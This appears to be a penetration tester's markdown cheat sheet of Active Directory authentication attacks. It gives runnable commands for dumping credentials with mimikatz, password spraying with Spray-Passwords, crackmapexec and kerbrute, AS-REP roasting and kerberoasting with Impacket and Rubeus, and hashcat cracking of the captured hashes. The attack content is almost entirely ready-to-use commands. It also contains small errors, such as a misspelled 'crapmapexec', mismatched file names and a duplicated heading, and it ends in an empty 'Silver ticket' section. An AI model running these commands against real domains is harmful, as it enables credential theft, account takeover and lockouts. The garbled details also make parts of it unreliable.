# AD authentication attacks

## Cached creds

https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

```
PS > .\mimikatz.exe
m $ sekurlsa::logonpasswords
PS2 > dir \\some\smb\share
m $ sekurlsa::tickets
```

## Authentication attacks

### Passwords

#### Principle

Lockout threshold for password attacks:
```
net accounts
```

AD authentication:
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $pdc + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
$searchString += $distinguishedName
New-Object System.DirectoryServices.DirectoryEntry($searchString, "someuser", "somepass")
```

#### Spray password attacks

Spray passwords: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```
PS > powershell -ep bypass
PS > .\Spray-Passwords.ps1 -Pass somepass -Admin
```

#### SMB attacks - crackmapexec

CrackMapExec GitHub: https://github.com/Porchetta-Industries/CrackMapExec

```
kali $ vi userstohack.txt
kali $ crapmapexec smb $targetIp -u userstoattack.txt -p 'somepassword' -d targetorganisation.com --continue-on-success
kali $ crapmapexec smb $targetIpRange.1-254 -u user -p 'password' -d targetorganisation.com --continue-on-success
```
Warning: can lock users out

#### Kerbrute

Kerbrute on GitHub: https://github.com/ropnop/kerbrute

```
PS > type userstohack.txt
PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.txt 'somepassword'
```

### AS-REQ Roasting

#### From Linux with Impacket-GetNPUsers

Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
```
$ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/someuser
$ hashcat --help | grep -i 'kerberos' # look for "AS-REP" in this case
$ hashcat -m 18200 hashes_as-rep_to_roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### From Windows with Rubeus

```
c:\path\to\rubeus.exe asreproast /nowrap
```
and `hashcat` back again:
```
hashcat -m 18200 hashes_as-rep_to_roast_from_windows.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### From Windows with Rubeus

Rubeus on GitHub: https://github.com/GhostPack/Rubeus
```
PS > .\Rubeus.exe asreproast /nowrap
```
Copy the hash and crack it on Kali with `hashcat`:
```
sudo hashcat -m 18200 hashes_retrieved_with_Rubeus_on_Windows /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Users to AS-REQ roast

To get only the users with option `Do not require Kerberos preauthentication` enabled on Linux:
```
$ impacket-GetNPUsers -dc-ip $TargetDcIp # No options
```
and on Windows:
```
Import-Module c:\path\to\powerview.ps1
Get-DomainUser -PreauthNotRequired
```

### Kerberoasting

#### With Impacket-GetUserSPNs

Impacket-GetUserSPNs on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
```
$ impacket-GetUserSPNs -request -dc-ip $TargetDomainControlerIp organisation.com/someuser
$ hashcat --help | grep -i kerberos
$ hashcat -m 13100 spn_hash_to_hack.txt /usr/share/wordlist/rockyou.txt -r myrulefile.rule --force
```

#### With Rubeus

```
PS c:\path\to\rubeus> .\Rubeus.exe kerberoast /outfile:spn_hash_to_hack.txt
```
and crack it with `hashcat`

### Silver ticket

```
